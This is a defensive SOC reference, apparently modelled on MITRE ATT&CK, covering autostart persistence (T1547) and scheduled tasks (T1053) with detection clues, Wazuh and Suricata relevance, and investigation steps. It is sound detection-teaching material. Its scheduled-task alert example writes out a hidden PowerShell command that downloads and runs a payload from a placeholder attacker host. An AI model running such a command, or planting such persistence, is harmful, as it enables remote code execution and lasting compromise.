# Boot or Logon Autostart Execution

**Technique ID:** T1547
**Tactic:** Persistence, Privilege Escalation

## Description
Adversaries may configure system settings to automatically execute a program during system boot or user logon to maintain persistence or gain higher-level privileges. Common mechanisms include Windows Registry Run keys, Startup folders, and modification of system configuration files like `/etc/rc.local` or `.bash_profile` on Linux.

## Attacker Behavior
Attackers place malicious executables or scripts in autostart locations or modify existing registry keys (e.g., `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`) to ensure their malware survives reboots and executes in the context of the logging-in user or the system itself.

## SOC Evidence
- Creation or modification of known autostart registry keys.
- File creation events in `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`.
- Modifications to Linux profile scripts or systemd service files.

## Detection Clues
Monitor Sysmon Event ID 12, 13, and 14 for Registry modifications targeting Run/RunOnce keys. Look for unsigned or suspiciously named binaries being added to startup folders. Baseline typical autostart configurations to identify anomalies.

## Related Techniques
- T1543: Create or Modify System Process
- T1037: Boot or Logon Initialization Scripts

## Example Alert Context
A SOC alert fires when `reg.exe` is used to add a new string value pointing to `C:\Users\Public\svchost.exe` within the `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` registry key.

## Wazuh Relevance
Wazuh's File Integrity Monitoring (FIM) and Syscheck modules can easily detect changes to critical registry keys and startup directories, generating high-severity alerts when persistence mechanisms are established.

## Suricata Relevance
Suricata generally does not detect local persistence mechanisms directly, as this behavior occurs entirely on the endpoint without generating specific network signatures.

## Investigation Guidance
Verify the integrity and digital signature of the newly configured autostart executable. Check if the parent process that created the persistence mechanism is a known administrative tool or something suspicious like a macro-enabled Word document. Remove the registry key and quarantine the executable.

---

# Scheduled Task/Job

**Technique ID:** T1053
**Tactic:** Execution, Persistence, Privilege Escalation

## Description
Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities like `schtasks` on Windows or `cron` on Linux allow users to schedule programs or scripts to run at specific times or context.

## Attacker Behavior
Attackers create scheduled tasks to execute a beacon or reverse shell on a regular cadence (e.g., every 5 minutes). They may also use scheduled tasks running as `SYSTEM` or `root` to elevate privileges. 

## SOC Evidence
- Command line usage of `schtasks.exe /create` or `crontab -e`.
- Windows Security Event ID 4698 (A scheduled task was created).
- Suspicious XML files dropped in `C:\Windows\System32\Tasks`.

## Detection Clues
Focus on the creation of scheduled tasks by non-administrative users or tasks that execute anomalous binaries (e.g., `powershell.exe`, `cmd.exe`, or binaries in user `AppData` directories). 

## Related Techniques
- T1078: Valid Accounts
- T1543: Create or Modify System Process

## Example Alert Context
An alert is triggered when a scheduled task named "WindowsUpdateCheck" is created via command line, configured to execute `powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')` every 10 minutes.

## Wazuh Relevance
Wazuh can collect Windows Event 4698 and monitor the command line execution of `schtasks.exe`. Its ruleset includes specific detections for scheduled tasks running suspicious scripting engines.

## Suricata Relevance
Suricata might detect the network traffic resulting from the scheduled task's execution (e.g., a periodic beacon to a C2 server), but not the creation of the task itself.

## Investigation Guidance
Review the scheduled task configuration (XML file or `crontab` entry) to identify the payload being executed. Trace the parent process that created the task to determine the root cause of the compromise. Delete the malicious task and investigate any network connections made by the payload.
